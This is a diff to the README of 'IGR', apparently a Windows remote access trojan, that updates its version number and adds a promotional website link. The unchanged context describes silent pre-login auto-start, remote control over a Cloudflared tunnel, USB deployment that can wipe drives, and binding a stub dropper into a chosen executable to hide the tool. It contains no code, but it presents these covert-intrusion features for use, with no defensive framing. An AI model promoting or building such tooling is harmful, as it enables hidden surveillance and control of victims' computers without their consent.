@@ -1,8 +1,10 @@
-# IGR v7.2
+# IGR v7.9
 
 <p align="center"><img src="files/logos/igr-logo2.png" width="200"></p>
 
 Silent auto-start remote access tool for Windows. Deploys via USB stick or EXE binding, starts before login, and exposes a full-featured web dashboard through a Cloudflared tunnel.
+
+**🌐 Website:** https://imaginegettingratted.vercel.app/
 
 ---
 
@@ -86,7 +88,7 @@ This will ask for:
 
 Then it installs dependencies, downloads cloudflared, compiles with PyInstaller, and deploys.
 
-Output: `dist\igr_v7.2.exe` (USB) or `dist\<target_name>.exe` (bind)
+Output: `dist\igr_v7.9.exe` (USB) or `dist\<target_name>.exe` (bind)
 
 ---
 
@@ -120,7 +122,7 @@ Build.bat will:
 - Inject credentials into a build copy of files/main.py
 - Install all Python dependencies
 - Download cloudflared.exe if not present
-- Build with PyInstaller → `dist\igr_v7.2.exe`
+- Build with PyInstaller → `dist\igr_v7.9.exe`
 - USB mode: detect plugged-in USB drives and offer to wipe+deploy or add IGR alongside existing files
 - EXE Bind mode: compile stub dropper, ask for target exe, bind stub+target+IGR into single exe
 
